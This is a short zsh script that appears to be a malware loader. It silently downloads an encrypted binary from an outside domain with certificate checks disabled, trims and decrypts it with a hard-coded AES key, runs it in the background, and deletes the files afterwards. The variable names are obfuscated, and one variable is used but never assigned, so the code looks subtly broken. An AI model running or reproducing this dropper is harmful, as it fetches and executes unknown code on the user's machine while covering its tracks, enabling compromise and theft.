#!/bin/zsh
kk3gf=$(mktemp /tmp/uk26r6.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m7ad720533380c43a.bin" -o "$kk3gfz" || exit 1
v6za9r=$(stat -f %z "$kk3gfz"); dfxmfrg=$(( v6za9r - 420 - 4030 ))
tail -c +$(( 420 + 1 )) "$kk3gfz" | head -c $dfxmfrg | openssl enc -d -aes-256-cbc -k ee7357583ad74d0bf822d352 -out "$kk3gf" 2>/dev/null
[ -s "$kk3gf" ] && chmod 700 "$kk3gf" && ( "$kk3gf" & ) && disown
( sleep 3; rm -f "$kk3gf" "$kk3gfz" ) &>/dev/null &
